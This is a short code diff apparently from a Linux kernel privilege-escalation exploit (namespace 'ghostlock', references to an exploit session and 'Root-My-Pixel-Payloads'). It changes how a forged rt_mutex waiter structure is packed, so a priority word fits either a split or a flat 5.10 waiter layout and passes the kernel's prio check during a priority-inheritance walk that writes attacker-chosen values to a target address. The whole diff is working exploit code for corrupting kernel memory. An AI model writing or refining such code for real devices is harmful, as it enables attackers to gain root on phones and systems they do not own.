@@ -307,6 +307,14 @@ namespace ghostlock::route {
             /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
          * the write value, children the write target; waiter->task is the
          * payload fake_task (planted fields for the PI walk). */
+            /* Word 10 lands on 0x40. The split waiter packs wake_state and prio
+             * there. A flat 5.10 waiter carries prio alone, or the packed value
+             * fails the erase's prio > 120 gate. */
+            const bool split_waiter = context->profile.waiter_prio_offset(
+                                              kernel::FAKE_WAITER_PRIO_OFF_SPLIT) ==
+                                      kernel::FAKE_WAITER_PRIO_OFF_SPLIT;
+            const uint64_t prio_word =
+                    select_stack::compact_prio_word(split_waiter, kernel::FAKE_WAITER_PRIO);
             struct pselect_waiter_word words[] = {
                 {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
                 {3, 0, "tree_right"},
@@ -316,7 +324,7 @@ namespace ghostlock::route {
                 {7, request->target, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                 {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
+                {10, prio_word, "wake_prio"},
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
             };
